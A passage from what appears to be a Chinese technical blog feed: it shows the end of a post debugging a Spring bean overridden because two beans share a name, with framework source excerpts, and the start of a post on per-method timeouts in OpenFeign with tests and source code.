class="string">"' in bean reference for "</span> + argName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> refName;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> BeanDefinitionHolder) &#123;</span><br><span class="line"><span class="comment">// Resolve BeanDefinitionHolder: contains BeanDefinition with name and aliases.</span></span><br><span class="line">BeanDefinitionHolder bdHolder = (BeanDefinitionHolder) value;</span><br><span class="line"><span class="keyword">return</span> resolveInnerBean(argName, bdHolder.getBeanName(), bdHolder.getBeanDefinition());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> BeanDefinition) &#123;</span><br><span class="line"><span class="comment">// Resolve plain BeanDefinition, without contained name: use dummy name.</span></span><br><span class="line">BeanDefinition bd = (BeanDefinition) value;</span><br><span class="line">String innerBeanName = <span class="string">"(inner bean)"</span> + BeanFactoryUtils.GENERATED_BEAN_NAME_SEPARATOR +</span><br><span class="line">ObjectUtils.getIdentityHexString(bd);</span><br><span class="line"><span class="keyword">return</span> resolveInnerBean(argName, innerBeanName, bd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedArray) &#123;</span><br><span class="line"><span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line">ManagedArray array = (ManagedArray) value;</span><br><span class="line">Class&lt;?&gt; elementType = array.resolvedElementType;</span><br><span class="line"><span class="keyword">if</span> (elementType == <span class="keyword">null</span>) &#123;</span><br><span class="line">String elementTypeName = array.getElementTypeName();</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(elementTypeName)) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">elementType = ClassUtils.forName(elementTypeName, <span class="keyword">this</span>.beanFactory.getBeanClassLoader());</span><br><span class="line">array.resolvedElementType = elementType;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line"><span class="comment">// Improve the message by showing the context.</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line"><span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line"><span class="string">"Error resolving array type for "</span> + argName, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">elementType = Object<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> resolveManagedArray(argName, (List&lt;?&gt;) value, elementType);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedList) &#123;</span><br><span class="line"><span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line"><span class="keyword">return</span> resolveManagedList(argName, (List&lt;?&gt;) value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedSet) &#123;</span><br><span class="line"><span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line"><span class="keyword">return</span> resolveManagedSet(argName, (Set&lt;?&gt;) value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedMap) &#123;</span><br><span class="line"><span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line"><span class="keyword">return</span> resolveManagedMap(argName, (Map&lt;?, ?&gt;) value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedProperties) &#123;</span><br><span class="line">Properties original = (Properties) value;</span><br><span class="line">Properties copy = <span class="keyword">new</span> Properties();</span><br><span class="line">original.forEach((propKey, propValue) -&gt; &#123;</span><br><span class="line"><span class="keyword">if</span> (propKey <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line">propKey = evaluate((TypedStringValue) propKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (propValue <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line">propValue = evaluate((TypedStringValue) propValue);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (propKey == <span class="keyword">null</span> || propValue == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line"><span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line"><span class="string">"Error converting Properties key/value pair for "</span> + argName + <span class="string">": resolved to null"</span>);</span><br><span class="line">&#125;</span><br><span class="line">copy.put(propKey, propValue);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> copy;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line"><span class="comment">// Convert value to target type here.</span></span><br><span class="line">TypedStringValue typedStringValue = (TypedStringValue) value;</span><br><span class="line">Object valueObject = evaluate(typedStringValue);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class&lt;?&gt; resolvedTargetType = resolveTargetType(typedStringValue);</span><br><span class="line"><span class="keyword">if</span> (resolvedTargetType != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.typeConverter.convertIfNecessary(valueObject, resolvedTargetType);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> valueObject;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line"><span class="comment">// Improve the message by showing the context.</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line"><span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line"><span class="string">"Error converting typed String value for "</span> + argName, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> NullBean) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> evaluate(value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>debug看了下，也确实是对的：</p><img src="/2020/04/29/spring-bean-duplic-name/image-20200429120415453.png"><p>跟进去， 发现：</p><img src="/2020/04/29/spring-bean-duplic-name/image-20200429120839555.png"><p>老的dao层关联的sessionFactory居然是新的（扫描路径不一样，这里只加载了新的mapper文件）。根据名称获取一把：</p><img src="/2020/04/29/spring-bean-duplic-name/image-20200429121457725.png"><h2 id="bean注册"><a href="#bean注册" class="headerlink" title="bean注册"></a>bean注册</h2><img src="/2020/04/29/spring-bean-duplic-name/image-20200429125600021.png"><img src="/2020/04/29/spring-bean-duplic-name/image-20200429125633517.png"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// Implementation of BeanDefinitionRegistry interface</span></span><br><span class="line"><span class="comment">//---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerBeanDefinition</span><span class="params">(String beanName, BeanDefinition beanDefinition)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> BeanDefinitionStoreException </span>&#123;</span><br><span class="line"></span><br><span class="line">Assert.hasText(beanName, <span class="string">"Bean name must not be empty"</span>);</span><br><span class="line">Assert.notNull(beanDefinition, <span class="string">"BeanDefinition must not be null"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (beanDefinition <span class="keyword">instanceof</span> AbstractBeanDefinition) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">((AbstractBeanDefinition) beanDefinition).validate();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (BeanDefinitionValidationException ex) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,</span><br><span class="line"><span class="string">"Validation of bean definition failed"</span>, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里发生了覆盖</span></span><br><span class="line">BeanDefinition existingDefinition = <span class="keyword">this</span>.beanDefinitionMap.get(beanName);</span><br><span class="line"><span class="keyword">if</span> (existingDefinition != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!isAllowBeanDefinitionOverriding()) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,</span><br><span class="line"><span class="string">"Cannot register bean definition ["</span> + beanDefinition + <span class="string">"] for bean '"</span> + beanName +</span><br><span class="line"><span class="string">"': There is already ["</span> + existingDefinition + <span class="string">"] bound."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (existingDefinition.getRole() &lt; beanDefinition.getRole()) &#123;</span><br><span class="line"><span class="comment">// e.g. was ROLE_APPLICATION, now overriding with ROLE_SUPPORT or ROLE_INFRASTRUCTURE</span></span><br><span class="line"><span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">logger.warn(<span class="string">"Overriding user-defined bean definition for bean '"</span> + beanName +</span><br><span class="line"><span class="string">"' with a framework-generated bean definition: replacing ["</span> +</span><br><span class="line">existingDefinition + <span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!beanDefinition.equals(existingDefinition)) &#123;</span><br><span class="line">        <span class="comment">// 走到了这里，打印了override的日志，不过是info级别的</span></span><br><span class="line"><span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">logger.info(<span class="string">"Overriding bean definition for bean '"</span> + beanName +</span><br><span class="line"><span class="string">"' with a different definition: replacing ["</span> + existingDefinition +</span><br><span class="line"><span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Overriding bean definition for bean '"</span> + beanName +</span><br><span class="line"><span class="string">"' with an equivalent definition: replacing ["</span> + existingDefinition +</span><br><span class="line"><span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (hasBeanCreationStarted()) &#123;</span><br><span class="line"><span class="comment">// Cannot modify startup-time collection elements anymore (for stable iteration)</span></span><br><span class="line"><span class="keyword">synchronized</span> (<span class="keyword">this</span>.beanDefinitionMap) &#123;</span><br><span class="line"><span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">List&lt;String&gt; updatedDefinitions = <span class="keyword">new</span> ArrayList&lt;&gt;(<span class="keyword">this</span>.beanDefinitionNames.size() + <span class="number">1</span>);</span><br><span class="line">updatedDefinitions.addAll(<span class="keyword">this</span>.beanDefinitionNames);</span><br><span class="line">updatedDefinitions.add(beanName);</span><br><span class="line"><span class="keyword">this</span>.beanDefinitionNames = updatedDefinitions;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.manualSingletonNames.contains(beanName)) &#123;</span><br><span class="line">Set&lt;String&gt; updatedSingletons = <span class="keyword">new</span> LinkedHashSet&lt;&gt;(<span class="keyword">this</span>.manualSingletonNames);</span><br><span class="line">updatedSingletons.remove(beanName);</span><br><span class="line"><span class="keyword">this</span>.manualSingletonNames = updatedSingletons;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Still in startup registration phase</span></span><br><span class="line"><span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line"><span class="keyword">this</span>.beanDefinitionNames.add(beanName);</span><br><span class="line"><span class="keyword">this</span>.manualSingletonNames.remove(beanName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.frozenBeanDefinitionNames = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (existingDefinition != <span class="keyword">null</span> || containsSingleton(beanName)) &#123;</span><br><span class="line">resetBeanDefinition(beanName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/04/29/spring-bean-duplic-name/image-20200429125804639.png"><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>最终排查下来，发现只是bean的名称重复，导致覆盖；跟<code>@Primary</code>没有关系。在成文的过程中又一起<strong>不加思索地复制粘贴</strong>引起的故障</p><img src="/2020/04/29/spring-bean-duplic-name/image-20200429130442650.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of <span class="built_in">type</span> <span class="string">'com.atour.pay.api.remote.statistics.TransStatisticsRemote'</span> available</span><br><span class="line">at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:347)</span><br><span class="line">at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:334)</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1103)</span><br></pre></td></tr></table></figure><p>还是需要保持敬畏之心，多去了解，不能无脑的粘贴。同时我们的基础建设不够完善，才导致了这么多复制粘贴的代码，道阻且长！</p><p>覆盖的规则可以参考， <a href="https://blog.csdn.net/f641385712/article/details/93777536" rel="external nofollow noopener noreferrer" target="_blank">聊聊Spring的bean覆盖（存在同名name/id问题），介绍Spring名称生成策略接口BeanNameGenerator【享学Spring】_Java_BAT的乌托邦-CSDN博客</a>, 这里简单贴下结论：</p><blockquote><ul><li>同一个配置文件内同名的<code>Bean</code>，<strong>以最上面定义的为准</strong></li><li>不同配置文件中存在同名Bean，<code>后解析</code>的配置文件会覆盖<code>先解析</code>的配置文件（配置文件的先后顺序其实会受到<code>@Order</code>来控制）</li><li>通过<code>@ComponentScan</code>扫描进来的优先级是最低的，原因就是它扫描进来的Bean定义是<strong>最先</strong>被注册的~</li><li>在不同容器内，即使<code>Bean</code>名称相同，它们也是能够<strong>和谐共存</strong>的（想想父子容器）</li></ul></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.iflym.com/index.php/code/201208290002.html" rel="external nofollow noopener noreferrer" target="_blank">Spring中获取一个bean的流程-2 – i flym</a></li><li><a href="https://blog.csdn.net/f641385712/article/details/93777536" rel="external nofollow noopener noreferrer" target="_blank">聊聊Spring的bean覆盖（存在同名name/id问题），介绍Spring名称生成策略接口BeanNameGenerator【享学Spring】_Java_BAT的乌托邦-CSDN博客</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;现象&quot;&gt;&lt;a href=&quot;#现象&quot; class=&quot;headerlink&quot; title=&quot;现象&quot;&gt;&lt;/a&gt;现象&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span c
      
    
    </summary>
    
      <category term="spring" scheme="http://qsli.github.io/categories/spring/"/>
    
    
      <category term="spring-bean" scheme="http://qsli.github.io/tags/spring-bean/"/>
    
  </entry>
  
  <entry>
    <title>Feign方法级别的超时</title>
    <link href="http://qsli.github.io/2020/04/28/feign-method-timeout/"/>
    <id>http://qsli.github.io/2020/04/28/feign-method-timeout/</id>
    <published>2020-04-28T06:00:44.000Z</published>
    <updated>2020-04-28T06:00:44.543Z</updated>
    
    <content type="html"><![CDATA[<img src="/2020/04/28/feign-method-timeout/image-20200428135947174.png"><h2 id="Feign方法级别的超时"><a href="#Feign方法级别的超时" class="headerlink" title="Feign方法级别的超时"></a>Feign方法级别的超时</h2><ul><li><p>discussion</p><p><a href="https://github.com/OpenFeign/feign/issues/562" rel="external nofollow noopener noreferrer" target="_blank">Per request timeout options · Issue #562 · OpenFeign/feign</a></p></li><li><p>版本 &gt;= 10.3.0</p></li></ul><img src="/2020/04/28/feign-method-timeout/WeChatWorkScreenshot_cb1954f6-abee-48ad-8dc5-14e9ef579bb9.png"><ul><li>源码中的单测：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> pengfei.zhao</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"deprecation"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OptionsTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">interface</span> <span class="title">OptionsInterface</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestLine</span>(<span class="string">"GET /"</span>)</span><br><span class="line">    <span class="comment">// 参数中多了一个超时的配置</span></span><br><span class="line">    <span class="function">String <span class="title">get</span><span class="params">(Request.Options options)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestLine</span>(<span class="string">"GET /"</span>)</span><br><span class="line">    <span class="function">String <span class="title">get</span><span class="params">()</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Rule</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">final</span> ExpectedException thrown = ExpectedException.none();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 测试总的配置会导致超时</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">socketTimeoutTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MockWebServer server = <span class="keyword">new</span> MockWebServer();</span><br><span class="line">    server.enqueue(<span class="keyword">new</span> MockResponse().setBody(<span class="string">"foo"</span>).setBodyDelay(<span class="number">3</span>, TimeUnit.SECONDS));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> OptionsInterface api = Feign.builder()</span><br><span class="line">        .options(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">1000</span>))</span><br><span class="line">        .target(OptionsInterface.class, server.url("/").toString());</span><br><span class="line"></span><br><span class="line">    thrown.expect(FeignException<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    thrown.expectCause(CoreMatchers.isA(SocketTimeoutException<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line"></span><br><span class="line">    api.get();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 接口级别的配置可以覆盖总的配置，从而在等待3s之后拿到结果</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">normalResponseTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MockWebServer server = <span class="keyword">new</span> MockWebServer();</span><br><span class="line">    server.enqueue(<span class="keyword">new</span> MockResponse().setBody(<span class="string">"foo"</span>).setBodyDelay(<span class="number">3</span>, TimeUnit.SECONDS));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> OptionsInterface api = Feign.builder()</span><br><span class="line">        .options(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">1000</span>))</span><br><span class="line">        .target(OptionsInterface.class, server.url("/").toString());</span><br><span class="line"></span><br><span class="line">    assertThat(api.get(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">4</span> * <span class="number">1000</span>))).isEqualTo(<span class="string">"foo"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="部分源码"><a href="#部分源码" class="headerlink" title="部分源码"></a>部分源码</h3><p>版本：<code>10.10.1</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// feign.SynchronousMethodHandler#invoke</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object[] argv)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    RequestTemplate template = buildTemplateFromArgs.create(argv);</span><br><span class="line">    <span class="comment">// 从参数中找对应的option</span></span><br><span class="line">    Options options = findOptions(argv);</span><br><span class="line">    Retryer retryer = <span class="keyword">this</span>.retryer.clone();</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> executeAndDecode(template, options);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (RetryableException e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          retryer.continueOrPropagate(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RetryableException th) &#123;</span><br><span class="line">          Throwable cause = th.getCause();</span><br><span class="line">          <span class="keyword">if</span> (propagationPolicy == UNWRAP &amp;&amp; cause != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> cause;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logLevel != Logger.Level.NONE) &#123;</span><br><span class="line">          logger.logRetry(metadata.configKey(), logLevel);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>findOptions</code>的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Options <span class="title">findOptions</span><span class="params">(Object[] argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argv == <span class="keyword">null</span> || argv.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.options;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Stream.of(argv)</span><br><span class="line">      .filter(Options.class::isInstance)</span><br><span class="line">      .map(Options.class::cast)</span><br><span class="line">      .findFirst()</span><br><span class="line">    <span class="comment">// fall back to总的超时</span></span><br><span class="line">      .orElse(<span class="keyword">this</span>.options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>如果使用<code>feign-ribbon</code>，版本要和<code>feign-core</code>保持一致，不然会报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: url values must be not be absolute.</span><br><span class="line"></span><br><span class="line">at feign.RequestTemplate.uri(RequestTemplate.java:438)</span><br><span class="line">at feign.RequestTemplate.uri(RequestTemplate.java:425)</span><br><span class="line">at feign.RequestTemplate.append(RequestTemplate.java:392)</span><br><span class="line">at feign.ribbon.LBClient<span class="variable">$RibbonRequest</span>.toRequest(LBClient.java:100)</span><br><span class="line">at feign.ribbon.LBClient.getRequestSpecificRetryHandler(LBClient.java:79)</span><br><span class="line">at feign.ribbon.LBClient.getRequestSpecificRetryHandler(LBClient.java:38)</span><br><span class="line">at com.netflix.client.AbstractLoadBalancerAwareClient.buildLoadBalancerCommand(AbstractLoadBalancerAwareClient.java:127)</span><br><span class="line">at com.netflix.client.AbstractLoadBalancerAwareClient.executeWithLoadBalancer(AbstractLoadBalancerAwareClient.java:94)</span><br><span class="line">at feign.ribbon.RibbonClient.execute(RibbonClient.java:69)</span><br><span class="line">at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:119)</span><br><span class="line">at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89)</span><br><span class="line">at feign.ReflectiveFeign<span class="variable">$FeignInvocationHandler</span>.invoke(ReflectiveFeign.java:100)</span><br><span class="line">at com.sun.proxy.<span class="variable">$Proxy36</span>.getEffectiveMebIds(Unknown 